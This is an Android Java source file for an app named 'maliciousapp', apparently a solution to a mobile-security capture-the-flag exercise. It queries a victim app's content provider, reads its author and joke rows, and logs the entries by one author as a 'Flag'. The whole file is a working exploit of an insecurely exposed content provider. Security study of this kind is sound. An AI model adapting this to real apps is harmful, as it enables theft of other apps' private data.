package com.example.maliciousapp;

import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import java.security.Signature;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MOBIOTSEC";
    static final String PROVIDER_NAME = "com.example.victimapp.MyProvider";
    static final String TABLE_NAME = "joke";
    static final String URL = "content://com.example.victimapp.MyProvider/joke";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        android.content.pm.Signature[] sigs = new android.content.pm.Signature[0];
        try {
            sigs = this.getPackageManager().getPackageInfo(this.getPackageName(), PackageManager.GET_SIGNATURES).signatures;
        } catch (PackageManager.NameNotFoundException e) {
            throw new RuntimeException(e);
        }
        for (android.content.pm.Signature sig : sigs) {
            Log.i("MOBIOTSEC", "Signature hashcode malicious: " + sig.hashCode());
        }

        Uri contentUri = Uri.parse(URL);

        String[] projection = { "author", "joke" };

        Log.i(TAG,"Cursor Query Start");

        Cursor cursor = getContentResolver().query(
                contentUri,
                projection,
                null,
                null,
                null
        );

        Log.i(TAG,"Cursor Query Done");
        StringBuilder stringBuilder = new StringBuilder();

        if (cursor == null) {
            Log.e(TAG,"Null Cursor Error");
        }
        else if (cursor.getCount() < 1) {
            Log.d(TAG,"Unsuccessful Cursor Search");
        } else {
            while (cursor.moveToNext()) {
                int authorIndex = cursor.getColumnIndex("author");
                String authorValue = cursor.getString(authorIndex);
                Log.i(TAG,"Author: " + authorValue);

                int jokeIndex = cursor.getColumnIndex("joke");
                String jokeValue = cursor.getString(jokeIndex);
                Log.i(TAG,"Joke: " + jokeValue);

                if (authorValue.equals("elosiouk")) {
                    stringBuilder.append(jokeValue);
                }
            }
            cursor.close();
        }
        Log.i(TAG,"Flag: " + stringBuilder.toString());
    }
}